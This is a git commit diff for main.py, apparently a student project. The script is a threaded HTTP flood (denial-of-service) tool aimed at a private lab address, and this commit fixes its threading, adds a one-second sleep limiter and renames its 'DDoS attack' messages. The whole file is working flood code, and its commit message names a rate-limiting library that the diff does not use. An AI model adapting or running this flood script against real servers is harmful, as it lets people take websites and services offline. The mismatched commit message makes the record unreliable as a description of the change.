51860f50545c3125b50c49774a47308226898084
sydneychamber <sydneyjchambers@students.utech.edu.jm>
2024-03-27 22:47:50 -0400

    Implemented Rate Limiting using the limits library offered by Python

--- main.py
+++ main.py
@@ -1,14 +1,41 @@
 import requests
 import threading
 import subprocess
+from datetime import datetime, timedelta
+import time
+
+# Global variables to track rate limiting
+last_request_time = datetime.min
+lock = threading.Lock()
+
 
 def show_logs():
     try:
-        log_display = subprocess.check_output(['tail', '-n', '10', '/var/lo0g/apache2/access.log'])
+        log_display = subprocess.check_output(['tail', '-n', '10', '/var/log/apache2/access.log'])
         log_display = log_display.decode('utf-8')
         print(log_display)
     except subprocess.CalledProcessError as e:
         print(f"Error: {e}")
+
+
+def rate_limiting():
+    global last_request_time, lock
+
+    print("Executing rate limiting (1 second between allowed requests)...")
+
+    # Acquire lock to ensure thread safety
+    with lock:
+        current_time = datetime.now()
+        time_since_last_request = current_time - last_request_time
+
+        # Checks if the rate limit has been reached
+        if time_since_last_request < timedelta(seconds=1):
+            # Sleep to enforce rate limiting
+            time.sleep((timedelta(seconds=1) - time_since_last_request).total_seconds())
+
+        # Update last request time
+        last_request_time = datetime.now()
+
 
 def http_flood(target_url, num_of_requests):
     user_agents = {
@@ -31,24 +58,25 @@ def http_flood(target_url, num_of_requests):
             send_request = requests.get(target_url, headers=user_agents, verify=False)
             print(f"Request status: {send_request.status_code}")
             print()
+
+            # Call the rate limiting function
+            rate_limiting()
         except Exception as e:
             print(f"Error: {str(e)}")
 
 
 if __name__ == "__main__":
-    target_url = "https://10.0.2.15"
+    target_url = "http://10.0.2.15/real-estate-html-template/index.html"
     num_of_requests = 50
 
-    print(f"Starting http flood, targeting {target_url}")
+    print(f"Starting HTTP flood, targeting {target_url}")
 
     # Creates and sends multiple threads synchronously
     threads = []
     for _ in range(5):
-        thread = threading.Thread(target=http_flood(target_url, num_of_requests))
+        thread = threading.Thread(target=http_flood, args=(target_url, num_of_requests))
         threads.append(thread)
         thread.start()
-
     for thread in threads:
         thread.join()
-
-    print(f"DDoS attack finished.")
+    print(f"HTTP flood finished.")
